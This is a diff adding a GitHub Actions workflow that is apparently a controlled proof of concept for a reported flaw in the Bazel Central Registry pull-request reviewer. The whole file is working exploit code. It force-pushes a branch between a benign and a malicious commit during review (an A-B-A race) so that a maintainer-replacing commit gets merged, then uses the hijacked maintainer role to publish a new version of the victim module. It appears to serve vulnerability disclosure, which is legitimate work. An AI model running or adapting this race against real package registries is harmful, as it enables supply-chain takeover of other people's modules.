@@ -1,0 +1,513 @@
+name: Persistent BCR namespace takeover proof
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: Controlled proof phase
+        required: true
+        type: choice
+        options:
+          - prepare
+          - control
+          - exploit
+          - publish
+        default: prepare
+      switch_to_b_ms:
+        description: Delay before selecting benign B
+        required: true
+        default: "8000"
+      hold_b_ms:
+        description: Time to expose benign B before restoring A
+        required: true
+        default: "22000"
+
+permissions:
+  actions: read
+  checks: read
+  contents: write
+  issues: write
+  pull-requests: write
+
+env:
+  OWNED_MODULE: owned_e2e
+  VICTIM_MODULE: victim_e2e
+  CONTROL_MODULE: victim_control_e2e
+
+jobs:
+  prepare:
+    if: inputs.mode == 'prepare'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create baseline plus benign B and malicious A
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const alice = {
+              email: 'controlled-poc@example.invalid',
+              github: 'neacsumarius1992',
+              github_user_id: 62901364,
+              name: 'Controlled attacker identity',
+            };
+            const originalVictim = {
+              email: 'controlled-victim@example.invalid',
+              github: 'github-actions[bot]',
+              github_user_id: 41898282,
+              name: 'Synthetic original victim maintainer',
+            };
+            const metadata = (moduleName, maintainer, versions) => `${JSON.stringify({
+              homepage: `https://example.invalid/${moduleName}`,
+              maintainers: [maintainer],
+              versions,
+              yanked_versions: {},
+            }, null, 4)}\n`;
+            const blob = (path, content) => ({
+              path, mode: '100644', type: 'blob', content,
+            });
+            const moduleFile = (name, version) =>
+              `module(name = "${name}", version = "${version}")\n`;
+
+            const mainRef = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
+            const mainCommit = await github.rest.git.getCommit({
+              owner, repo, commit_sha: mainRef.data.object.sha,
+            });
+
+            const baselineEntries = [
+              blob(`modules/${process.env.OWNED_MODULE}/metadata.json`,
+                metadata(process.env.OWNED_MODULE, alice, ['1.0.0'])),
+              blob(`modules/${process.env.OWNED_MODULE}/1.0.0/MODULE.bazel`,
+                moduleFile(process.env.OWNED_MODULE, '1.0.0')),
+              blob(`modules/${process.env.VICTIM_MODULE}/metadata.json`,
+                metadata(process.env.VICTIM_MODULE, originalVictim, ['1.0.0'])),
+              blob(`modules/${process.env.VICTIM_MODULE}/1.0.0/MODULE.bazel`,
+                moduleFile(process.env.VICTIM_MODULE, '1.0.0')),
+              blob(`modules/${process.env.CONTROL_MODULE}/metadata.json`,
+                metadata(process.env.CONTROL_MODULE, originalVictim, ['1.0.0'])),
+              blob(`modules/${process.env.CONTROL_MODULE}/1.0.0/MODULE.bazel`,
+                moduleFile(process.env.CONTROL_MODULE, '1.0.0')),
+              { path: `modules/${process.env.OWNED_MODULE}/1.0.1/MODULE.bazel`, mode: '100644', type: 'blob', sha: null },
+              { path: `modules/${process.env.VICTIM_MODULE}/1.0.1/MODULE.bazel`, mode: '100644', type: 'blob', sha: null },
+              { path: `modules/${process.env.CONTROL_MODULE}/1.0.1/MODULE.bazel`, mode: '100644', type: 'blob', sha: null },
+            ];
+            const baselineTree = await github.rest.git.createTree({
+              owner, repo, base_tree: mainCommit.data.tree.sha, tree: baselineEntries,
+            });
+            const baseline = await github.rest.git.createCommit({
+              owner,
+              repo,
+              message: 'E2E baseline: Alice owns owned_e2e; synthetic victim owns victim_e2e',
+              tree: baselineTree.data.sha,
+              parents: [mainRef.data.object.sha],
+            });
+            await github.rest.git.updateRef({
+              owner, repo, ref: 'heads/main', sha: baseline.data.sha,
+            });
+
+            const benignTree = await github.rest.git.createTree({
+              owner,
+              repo,
+              base_tree: baselineTree.data.sha,
+              tree: [
+                blob(`modules/${process.env.OWNED_MODULE}/metadata.json`,
+                  metadata(process.env.OWNED_MODULE, alice, ['1.0.0', '1.0.1'])),
+                blob(`modules/${process.env.OWNED_MODULE}/1.0.1/MODULE.bazel`,
+                  moduleFile(process.env.OWNED_MODULE, '1.0.1')),
+              ],
+            });
+            const benign = await github.rest.git.createCommit({
+              owner,
+              repo,
+              message: 'B: authorized owned_e2e version only',
+              tree: benignTree.data.sha,
+              parents: [baseline.data.sha],
+            });
+
+            const maliciousTree = await github.rest.git.createTree({
+              owner,
+              repo,
+              base_tree: benignTree.data.sha,
+              tree: [
+                blob(`modules/${process.env.VICTIM_MODULE}/metadata.json`,
+                  metadata(process.env.VICTIM_MODULE, alice, ['1.0.0'])),
+              ],
+            });
+            const malicious = await github.rest.git.createCommit({
+              owner,
+              repo,
+              message: 'A: replace unrelated victim_e2e maintainer with Alice',
+              tree: maliciousTree.data.sha,
+              parents: [benign.data.sha],
+            });
+
+            const upsertRef = async (ref, sha) => {
+              try {
+                await github.rest.git.updateRef({ owner, repo, ref, sha, force: true });
+              } catch (error) {
+                if (error.status !== 404 && error.status !== 422) throw error;
+                await github.rest.git.createRef({ owner, repo, ref: `refs/${ref}`, sha });
+              }
+            };
+            await upsertRef('tags/e2e-benign-B', benign.data.sha);
+            await upsertRef('tags/e2e-malicious-A', malicious.data.sha);
+            await upsertRef('heads/poc/persistent-takeover-bot', malicious.data.sha);
+
+            for (const name of ['auto-merged', 'presubmit-auto-run', 'low-ci-priority']) {
+              try {
+                await github.rest.issues.createLabel({ owner, repo, name, color: 'ededed' });
+              } catch (error) {
+                if (error.status !== 422) throw error;
+              }
+            }
+
+            const existing = await github.rest.pulls.list({
+              owner, repo, state: 'open', head: `${owner}:poc/persistent-takeover-bot`,
+            });
+            let pr;
+            if (existing.data.length) {
+              pr = existing.data[0];
+            } else {
+              const created = await github.rest.pulls.create({
+                owner,
+                repo,
+                head: 'poc/persistent-takeover-bot',
+                base: 'main',
+                title: 'E2E proof: cross-module maintainer takeover',
+                body: [
+                  'Controlled GitHub.com proof for Google issue 569037834.',
+                  '',
+                  'B changes only owned_e2e. A additionally replaces the synthetic victim_e2e maintainer.',
+                  'All identities, modules, branches, and content are controlled test fixtures.',
+                ].join('\n'),
+              });
+              pr = created.data;
+            }
+            await github.rest.issues.addLabels({
+              owner, repo, issue_number: pr.number, labels: ['presubmit-auto-run'],
+            });
+            core.notice(`BASELINE_SHA=${baseline.data.sha}`);
+            core.notice(`BENIGN_B_SHA=${benign.data.sha}`);
+            core.notice(`MALICIOUS_A_SHA=${malicious.data.sha}`);
+            core.notice(`TAKEOVER_PR=${pr.number}`);
+            core.notice('BASELINE: owned_e2e=Alice; victim_e2e=github-actions[bot]');
+
+  control:
+    if: inputs.mode == 'control'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create an unrelated victim publication that Alice cannot authorize
+        id: create_control
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const moduleName = process.env.CONTROL_MODULE;
+            const branch = `poc/control-before-takeover-${context.runId}`;
+            const main = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
+            const mainCommit = await github.rest.git.getCommit({
+              owner, repo, commit_sha: main.data.object.sha,
+            });
+            const { data: current } = await github.rest.repos.getContent({
+              owner, repo, path: `modules/${moduleName}/metadata.json`, ref: 'main',
+            });
+            const metadata = JSON.parse(Buffer.from(current.content, 'base64').toString('utf8'));
+            metadata.versions = ['1.0.0', '1.0.1'];
+            const tree = await github.rest.git.createTree({
+              owner,
+              repo,
+              base_tree: mainCommit.data.tree.sha,
+              tree: [
+                { path: `modules/${moduleName}/metadata.json`, mode: '100644', type: 'blob', content: `${JSON.stringify(metadata, null, 4)}\n` },
+                { path: `modules/${moduleName}/1.0.1/MODULE.bazel`, mode: '100644', type: 'blob', content: `module(name = "${moduleName}", version = "1.0.1")\n` },
+              ],
+            });
+            const commit = await github.rest.git.createCommit({
+              owner, repo, message: 'CONTROL: Alice attempts victim_control_e2e publication',
+              tree: tree.data.sha, parents: [main.data.object.sha],
+            });
+            await github.rest.git.createRef({ owner, repo, ref: `refs/heads/${branch}`, sha: commit.data.sha });
+            const created = await github.rest.pulls.create({
+              owner,
+              repo,
+              head: branch,
+              base: 'main',
+              title: 'CONTROL: publication must be rejected before takeover',
+              body: 'Alice will approve this synthetic victim publication, but is not its maintainer. The exact reviewer must refuse it.',
+            });
+            await github.rest.issues.addLabels({
+              owner, repo, issue_number: created.data.number, labels: ['presubmit-auto-run'],
+            });
+            core.exportVariable('CONTROL_PR', String(created.data.number));
+            core.exportVariable('CONTROL_SHA', commit.data.sha);
+            core.notice(`CONTROL_PR=${created.data.number}`);
+            core.notice(`CONTROL_SHA=${commit.data.sha}`);
+
+      - name: Alice approves the controlled victim publication
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.BCR_POC_PAT }}
+          script: |
+            await github.rest.pulls.createReview({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              pull_number: Number(process.env.CONTROL_PR),
+              commit_id: process.env.CONTROL_SHA,
+              event: 'APPROVE',
+              body: 'CONTROL: approval by Alice before she is a maintainer.',
+            });
+
+      - name: Run exact BCR reviewer revision for the negative control
+        uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e
+        with:
+          token: ${{ secrets.BCR_POC_PAT }}
+          action-type: review_prs
+
+      - name: Verify rejection and convert control PR to draft
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const pr = await github.rest.pulls.get({
+              owner, repo, pull_number: Number(process.env.CONTROL_PR),
+            });
+            if (pr.data.merged) throw new Error('Negative control unexpectedly merged');
+            if (pr.data.state !== 'open') throw new Error(`Unexpected control state: ${pr.data.state}`);
+            await github.graphql(`mutation($id:ID!){convertPullRequestToDraft(input:{pullRequestId:$id}){pullRequest{isDraft}}}`, {
+              id: pr.data.node_id,
+            });
+            core.notice('BCR_E2E_CONTROL_START');
+            core.notice(`PR #${pr.data.number}: Alice approval present, merged=false`);
+            core.notice('Reason: main still records github-actions[bot] as victim_control_e2e maintainer');
+            core.notice('BCR_E2E_CONTROL_END');
+
+  racer:
+    if: inputs.mode == 'exploit'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Coordinate A-B-A transition and approve benign B
+        uses: actions/github-script@v7
+        env:
+          SWITCH_TO_B_MS: ${{ inputs.switch_to_b_ms }}
+          HOLD_B_MS: ${{ inputs.hold_b_ms }}
+        with:
+          github-token: ${{ secrets.BCR_POC_PAT }}
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const suffix = `${context.runId}-${context.runAttempt}`;
+            const readyTag = `e2e-racer-ready-${suffix}`;
+            const startTag = `e2e-reviewer-start-${suffix}`;
+            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+            const main = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
+            await github.rest.git.createRef({
+              owner, repo, ref: `refs/tags/${readyTag}`, sha: main.data.object.sha,
+            });
+            for (let attempt = 0; attempt < 120; attempt++) {
+              try {
+                await github.rest.git.getRef({ owner, repo, ref: `tags/${startTag}` });
+                break;
+              } catch (error) {
+                if (error.status !== 404) throw error;
+                if (attempt === 119) throw new Error(`Timed out waiting for ${startTag}`);
+                await sleep(1000);
+              }
+            }
+            const benign = await github.rest.git.getRef({ owner, repo, ref: 'tags/e2e-benign-B' });
+            const malicious = await github.rest.git.getRef({ owner, repo, ref: 'tags/e2e-malicious-A' });
+            await sleep(Number(process.env.SWITCH_TO_B_MS));
+            await github.rest.git.updateRef({
+              owner, repo, ref: 'heads/poc/persistent-takeover-bot',
+              sha: benign.data.object.sha, force: true,
+            });
+            const prs = await github.rest.pulls.list({
+              owner, repo, state: 'open', head: `${owner}:poc/persistent-takeover-bot`,
+            });
+            if (prs.data.length !== 1) throw new Error(`Expected one takeover PR, found ${prs.data.length}`);
+            await github.rest.pulls.createReview({
+              owner,
+              repo,
+              pull_number: prs.data[0].number,
+              commit_id: benign.data.object.sha,
+              event: 'APPROVE',
+              body: 'Controlled approval of benign B before restoring A.',
+            });
+            core.notice(`HEAD_TO_B=${benign.data.object.sha}`);
+            core.notice(`ALICE_APPROVED_B_ON_PR=${prs.data[0].number}`);
+            await sleep(Number(process.env.HOLD_B_MS));
+            await github.rest.git.updateRef({
+              owner, repo, ref: 'heads/poc/persistent-takeover-bot',
+              sha: malicious.data.object.sha, force: true,
+            });
+            core.notice(`HEAD_RESTORED_TO_A=${malicious.data.object.sha}`);
+
+  reviewer:
+    if: inputs.mode == 'exploit'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Wait for racer and publish start marker
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const suffix = `${context.runId}-${context.runAttempt}`;
+            const readyTag = `e2e-racer-ready-${suffix}`;
+            const startTag = `e2e-reviewer-start-${suffix}`;
+            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+            for (let attempt = 0; attempt < 120; attempt++) {
+              try {
+                await github.rest.git.getRef({ owner, repo, ref: `tags/${readyTag}` });
+                break;
+              } catch (error) {
+                if (error.status !== 404) throw error;
+                if (attempt === 119) throw new Error(`Timed out waiting for ${readyTag}`);
+                await sleep(1000);
+              }
+            }
+            const main = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
+            await github.rest.git.createRef({
+              owner, repo, ref: `refs/tags/${startTag}`, sha: main.data.object.sha,
+            });
+            core.notice(`REVIEWER_START_MARKER=${startTag}`);
+
+      - name: Stable synchronization delay
+        run: sleep 5
+
+      - name: Run exact affected BCR reviewer revision
+        uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e
+        with:
+          token: ${{ secrets.BCR_POC_PAT }}
+          action-type: review_prs
+
+  verify_takeover:
+    if: inputs.mode == 'exploit'
+    needs: [racer, reviewer]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Verify victim maintainer was replaced on main
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const { data } = await github.rest.repos.getContent({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              path: `modules/${process.env.VICTIM_MODULE}/metadata.json`,
+              ref: 'main',
+            });
+            const metadata = JSON.parse(Buffer.from(data.content, 'base64').toString('utf8'));
+            const maintainers = metadata.maintainers.map(item => item.github);
+            if (!maintainers.includes('neacsumarius1992')) {
+              throw new Error(`Takeover not present on main: ${maintainers.join(',')}`);
+            }
+            if (maintainers.includes('github-actions[bot]')) {
+              throw new Error('Original synthetic victim maintainer still present');
+            }
+            core.notice('BCR_E2E_TAKEOVER_START');
+            core.notice('MAIN victim_e2e maintainer before: github-actions[bot]');
+            core.notice('MAIN victim_e2e maintainer after: neacsumarius1992');
+            core.notice('BCR_E2E_TAKEOVER_END');
+
+  publish:
+    if: inputs.mode == 'publish'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create bot-authored victim release PR after takeover
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const moduleName = process.env.VICTIM_MODULE;
+            const branch = `poc/victim-publication-${context.runId}`;
+            const main = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
+            const mainCommit = await github.rest.git.getCommit({
+              owner, repo, commit_sha: main.data.object.sha,
+            });
+            const { data: current } = await github.rest.repos.getContent({
+              owner, repo, path: `modules/${moduleName}/metadata.json`, ref: 'main',
+            });
+            const metadata = JSON.parse(Buffer.from(current.content, 'base64').toString('utf8'));
+            if (!metadata.maintainers.some(item => item.github === 'neacsumarius1992')) {
+              throw new Error('Takeover is not present on main; refusing to continue');
+            }
+            metadata.versions = ['1.0.0', '1.0.1'];
+            const tree = await github.rest.git.createTree({
+              owner,
+              repo,
+              base_tree: mainCommit.data.tree.sha,
+              tree: [
+                { path: `modules/${moduleName}/metadata.json`, mode: '100644', type: 'blob', content: `${JSON.stringify(metadata, null, 4)}\n` },
+                { path: `modules/${moduleName}/1.0.1/MODULE.bazel`, mode: '100644', type: 'blob', content: `module(name = "${moduleName}", version = "1.0.1")\n` },
+              ],
+            });
+            const commit = await github.rest.git.createCommit({
+              owner, repo, message: 'Publish victim_e2e@1.0.1 using takeover authority',
+              tree: tree.data.sha, parents: [main.data.object.sha],
+            });
+            await github.rest.git.createRef({ owner, repo, ref: `refs/heads/${branch}`, sha: commit.data.sha });
+            const created = await github.rest.pulls.create({
+              owner,
+              repo,
+              head: branch,
+              base: 'main',
+              title: 'E2E proof: publish victim_e2e@1.0.1 after takeover',
+              body: [
+                'Second-stage proof for Google issue 569037834.',
+                '',
+                'Alice approves a new version of victim_e2e only after the ABA merge replaced its original synthetic maintainer.',
+              ].join('\n'),
+            });
+            await github.rest.issues.addLabels({
+              owner, repo, issue_number: created.data.number, labels: ['presubmit-auto-run'],
+            });
+            core.exportVariable('PUBLICATION_PR', String(created.data.number));
+            core.exportVariable('PUBLICATION_SHA', commit.data.sha);
+            core.notice(`PUBLICATION_PR=${created.data.number}`);
+            core.notice(`PUBLICATION_SHA=${commit.data.sha}`);
+
+      - name: Alice approves victim_e2e after takeover
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.BCR_POC_PAT }}
+          script: |
+            await github.rest.pulls.createReview({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              pull_number: Number(process.env.PUBLICATION_PR),
+              commit_id: process.env.PUBLICATION_SHA,
+              event: 'APPROVE',
+              body: 'Approval using the maintainer authority obtained through the demonstrated takeover.',
+            });
+
+      - name: Run exact affected BCR reviewer revision
+        uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e
+        with:
+          token: ${{ secrets.BCR_POC_PAT }}
+          action-type: review_prs
+
+      - name: Verify unauthorized victim publication reached main
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const pr = await github.rest.pulls.get({
+              owner, repo, pull_number: Number(process.env.PUBLICATION_PR),
+            });
+            if (!pr.data.merged) throw new Error('Publication PR was not merged');
+            const { data: moduleFile } = await github.rest.repos.getContent({
+              owner,
+              repo,
+              path: `modules/${process.env.VICTIM_MODULE}/1.0.1/MODULE.bazel`,
+              ref: 'main',
+            });
+            if (!moduleFile.sha) throw new Error('Published victim module version missing from main');
+            core.notice('BCR_E2E_PUBLICATION_START');
+            core.notice(`PR #${pr.data.number}: merged=true`);
+            core.notice('MAIN now contains victim_e2e@1.0.1');
+            core.notice('Authorization source: attacker identity persisted in victim_e2e metadata on main');
+            core.notice('BCR_E2E_PUBLICATION_END');
+
